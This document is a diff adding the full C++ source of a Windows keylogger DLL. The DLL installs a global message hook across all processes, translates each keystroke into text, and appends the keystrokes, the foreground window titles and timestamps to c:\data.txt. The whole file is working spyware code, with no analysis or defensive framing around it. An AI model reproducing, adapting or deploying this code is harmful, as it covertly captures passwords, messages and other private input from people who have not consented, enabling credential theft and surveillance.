@@ -1,0 +1,267 @@
+#include <cstdio>
+#include <iostream>
+#include <cstdlib>
+#include <queue>
+#include <windows.h>
+
+using namespace std;
+
+//This document module handle
+HINSTANCE g_hInstance = NULL;
+
+// HOOK hook handle
+HHOOK g_hHook = NULL;
+
+// Keyboard Log Path
+const CHAR KEYBOARD_LOG[30] = "c:\\data.txt";
+// Default length of string buffer
+const SHORT BUFF_LENGTH = 100;
+
+CONST DWORD KeyMask = 0x80000000;
+
+// Create shared memory segments
+// Param szPreTitle saves a file title
+#pragma data_seg("sharedata")
+CHAR szPreTitle[BUFF_LENGTH] = { 0 };
+#pragma data_seg()
+#pragma comment(linker, "/SECTION:sharedata,RWS")
+
+CHAR szBuff[BUFF_LENGTH] = { 0 };
+
+/*
+	The use of table-driven keybit mapping can reduce the large number of if-else structures in most keyloggers 
+  and greatly reduce the program size.
+*/
+
+// Keyboard virtual mapping table
+CONST UCHAR SPECIAL_SIGN_MAPPING_TABLE[][20] = {
+	{192, 189, 187, 219, 221, 220, 186, 222, 188, 190, 191},
+	{VK_F1, VK_F2, VK_F3, VK_F4, VK_F5, VK_F6, VK_F7, VK_F8, VK_F9, VK_F10, VK_F11, VK_F12},
+	{VK_ESCAPE, VK_TAB, VK_CONTROL, VK_MENU, VK_LWIN, VK_RWIN, VK_INSERT, VK_DELETE, VK_HOME, VK_RETURN, VK_SPACE},
+	{VK_NUMLOCK, VK_BACK, VK_END, VK_PRIOR, VK_NEXT, VK_CANCEL, VK_CLEAR, VK_SELECT, VK_PRINT, VK_EXECUTE, VK_LEFT, VK_RIGHT, VK_UP, VK_DOWN},
+	{VK_ADD, VK_SUBTRACT, VK_MULTIPLY, VK_DIVIDE, 190, 110},
+	{VK_NUMPAD0, VK_NUMPAD1, VK_NUMPAD2, VK_NUMPAD3, VK_NUMPAD4, VK_NUMPAD5, VK_NUMPAD6, VK_NUMPAD7, VK_NUMPAD8, VK_NUMPAD9}
+};
+
+// Real Character Mapping Code Table
+CONST CHAR* CONST OBJECT_SIGN_MAPPING_TABLE[][20] = {
+	{"0", "1", "2", "3", "4", "5", "6", "7", "8", "9"},
+	{ "!", "@", "#", "$", "%", "^", "&", "*", "(", ")" },
+	{ "`", "-", "=", "[", "]", "\\", ";", "\'", ",", ".", "/" },
+	{ "~", "_", "+", "{", "}", "\\|", ":", "\"", "<", ">", "?" },
+	{ "[F1]", "[F2]", "[F3]", "[F4]", "[F5]", "[F6]", "[F7]", "[F8]", "[F9]", "[F10]", "[F11]", "[F12]" },
+	{"[ESCAPE]", "[TAB]", "[CTRL]", "[ALT]", "[LWIN]", "[RWIN]", "[INSERT]", "[DELETE]", "[HOME]", "[Enter]", "[SPACE]"},
+	{"[NUMLOCK]", "[BACKSPACE]", "[END]", "[PGUP]", "[PGDOWN]", "[CANCEL]", "[CLEAR]", "[SELECT]", "[PRINT]", "[EXCUTE]", "[←]", "[→]", "[↑]", "[↓]" },
+	{"+", "-", "*", "/", ".", "."},
+	{"0", "1", "2", "3", "4", "5", "6", "7", "8", "9"},
+};
+
+// Dll Execution Entry
+BOOL APIENTRY DllMain(_In_ void* _DllHandle, _In_ unsigned long _Reason, _In_opt_ void* _Reserved)
+{
+	g_hInstance = (HINSTANCE)_DllHandle;
+	switch (_Reason)
+	{
+	case DLL_PROCESS_ATTACH:
+		break;
+	case DLL_THREAD_ATTACH:
+		break;
+	case DLL_PROCESS_DETACH:
+	case DLL_THREAD_DETACH:
+		if (g_hHook != NULL)
+		{
+			UnhookWindowsHookEx(g_hHook);
+		}
+		break;
+	}
+	return TRUE;
+}
+
+// Get the current local time
+VOID GetFmLocalTime(CHAR* szFmTime)
+{
+	ZeroMemory(szFmTime, BUFF_LENGTH);
+	SYSTEMTIME sys_t;
+	GetLocalTime(&sys_t);
+	sprintf_s(szFmTime, BUFF_LENGTH, "%4d/%02d/%02d %02d:%02d:%02d   ", sys_t.wYear, sys_t.wMonth, sys_t.wDay, sys_t.wHour, sys_t.wMinute, sys_t.wSecond);
+	return;
+}
+
+// Save characters to files
+VOID SetDataToFile(CHAR *buff)
+{
+	HANDLE hFile = CreateFile(KEYBOARD_LOG, GENERIC_WRITE, FILE_SHARE_READ, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
+	if (hFile == INVALID_HANDLE_VALUE)
+	{
+		MessageBox(NULL, "CreateFile Error", "Tips", MB_OK);
+		return;
+	}
+	if (SetFilePointer(hFile, 0, NULL, FILE_END) == -1)
+	{
+		MessageBox(NULL, "SetFilePointer Error", "Tips", MB_OK);
+		return;
+	}
+	DWORD dwWrite = 0;
+	if (!WriteFile(hFile, buff, strlen(buff), &dwWrite, NULL))
+	{
+		MessageBox(NULL, "WriteFile Error", "Tips", MB_OK);
+		return;
+	}
+	CloseHandle(hFile);
+	return;
+}
+
+// Keyboard hook callback function
+LRESULT CALLBACK KeyHookProc(
+	_In_ int    nCode,
+	_In_ WPARAM wParam,
+	_In_ LPARAM lParam
+)
+{
+	if (nCode < 0)
+		return CallNextHookEx(g_hHook, nCode, wParam, lParam);
+	if (nCode == HC_ACTION)
+	{
+		MSG *p = (MSG*)lParam;
+		//Determine whether a keystroke message is present
+		if (p->message == WM_KEYDOWN)
+		{
+			UCHAR vKey = (UCHAR)p->wParam;
+			ZeroMemory(szBuff, BUFF_LENGTH);
+			// Time and title information string
+			CHAR szInsert[BUFF_LENGTH] = "\0";
+			// Current window name
+			CHAR szNowTitle[BUFF_LENGTH] = "\0";
+			HWND hForegroundWnd = GetForegroundWindow();
+			GetWindowText(hForegroundWnd, szNowTitle, BUFF_LENGTH);
+			if (strcmp(szNowTitle, szPreTitle) != 0)
+			{
+				// Formatting time strings
+				CHAR szFmLocalTime[BUFF_LENGTH] = "\0";
+				GetFmLocalTime(szFmLocalTime);
+				strcat_s(szInsert, BUFF_LENGTH, "\r\n\r\n< ");
+				strcat_s(szInsert, BUFF_LENGTH, szFmLocalTime);
+				strcat_s(szInsert, BUFF_LENGTH, szNowTitle);
+				strcat_s(szInsert, BUFF_LENGTH, " >\r\n\r\n");
+				strcpy_s(szPreTitle, BUFF_LENGTH, szNowTitle);
+				SetDataToFile(szInsert);
+			}
+			DWORD iShift = GetKeyState(VK_SHIFT);
+			DWORD iCapital = GetKeyState(VK_CAPITAL);
+			DWORD iNumLock = GetKeyState(VK_NUMLOCK);
+			BOOL bShift = (iShift & KeyMask) == KeyMask;
+			BOOL bCapital = (iCapital & 1) == 1;
+			BOOL bNumLock = (iNumLock & 1) == 1;
+			// Top numeric key
+			if (vKey >= '0' && vKey <= '9')
+			{
+				if (!bShift)
+				{
+					strcat_s(szBuff, BUFF_LENGTH, OBJECT_SIGN_MAPPING_TABLE[0][vKey - '0']);
+				}
+				else
+				{
+					strcat_s(szBuff, BUFF_LENGTH, OBJECT_SIGN_MAPPING_TABLE[1][vKey - '0']);
+				}
+				goto END;
+			}
+			// Punctuation keys
+			for (int i = 0; i < 11; i++)
+			{
+				if (vKey == SPECIAL_SIGN_MAPPING_TABLE[0][i])
+				{
+					if (!bShift)
+					{
+						strcat_s(szBuff, BUFF_LENGTH, OBJECT_SIGN_MAPPING_TABLE[2][i]);
+					}
+					else
+					{
+						strcat_s(szBuff, BUFF_LENGTH, OBJECT_SIGN_MAPPING_TABLE[3][i]);
+					}
+					goto END;
+				}
+			}
+			// Letter key
+			if (vKey >= 'A' && vKey <= 'Z')
+			{
+				if (bShift || bCapital)
+				{
+					szBuff[0] = vKey;
+				}
+				else
+				{
+					szBuff[0] = vKey + 32;
+				}
+				goto END;
+			}
+			// F1 - F12 bond
+			for (int i = 0; i < 12; i++)
+			{
+				if (vKey == SPECIAL_SIGN_MAPPING_TABLE[1][i])
+				{
+					strcat_s(szBuff, BUFF_LENGTH, OBJECT_SIGN_MAPPING_TABLE[4][i]);
+					goto END;
+				}
+			}
+			// Special function key
+			for (int i = 0; i < 11; i++)
+			{
+				if (vKey == SPECIAL_SIGN_MAPPING_TABLE[2][i])
+				{
+					strcat_s(szBuff, BUFF_LENGTH, OBJECT_SIGN_MAPPING_TABLE[5][i]);
+					goto END;
+				}
+			}
+			for (int i = 0; i < 14; i++)
+			{
+				if (vKey == SPECIAL_SIGN_MAPPING_TABLE[3][i])
+				{
+					strcat_s(szBuff, BUFF_LENGTH, OBJECT_SIGN_MAPPING_TABLE[6][i]);
+					goto END;
+				}
+			}
+			// Keypad
+			for (int i = 0; i < 6; i++)
+			{
+				if (vKey == SPECIAL_SIGN_MAPPING_TABLE[4][i] && bNumLock)
+				{
+					strcat_s(szBuff, BUFF_LENGTH, OBJECT_SIGN_MAPPING_TABLE[7][i]);
+					goto END;
+				}
+			}
+			for (int i = 0; i < 10; i++)
+			{
+				if (vKey == SPECIAL_SIGN_MAPPING_TABLE[5][i] && bNumLock)
+				{
+					strcat_s(szBuff, BUFF_LENGTH, OBJECT_SIGN_MAPPING_TABLE[0][i]);
+					goto END;
+				}
+			}
+		END:
+			SetDataToFile(szBuff);
+		}
+	}
+	return CallNextHookEx(g_hHook, nCode, wParam, lParam);
+}
+
+// Deploy global hooks
+extern"C" __declspec(dllexport) BOOL StartHook()
+{
+	if (g_hHook != NULL)
+		return FALSE;
+	//Installation hook
+	g_hHook = SetWindowsHookEx(WH_GETMESSAGE, (HOOKPROC)KeyHookProc, g_hInstance, NULL);
+	return TRUE;
+}
+
+// Unloading hook
+BOOL StopHook()
+{
+	if (g_hHook != NULL)
+	{
+		if (!UnhookWindowsHookEx(g_hHook))
+			return FALSE;
+		g_hHook = NULL;
+	}
+	return TRUE;
+}
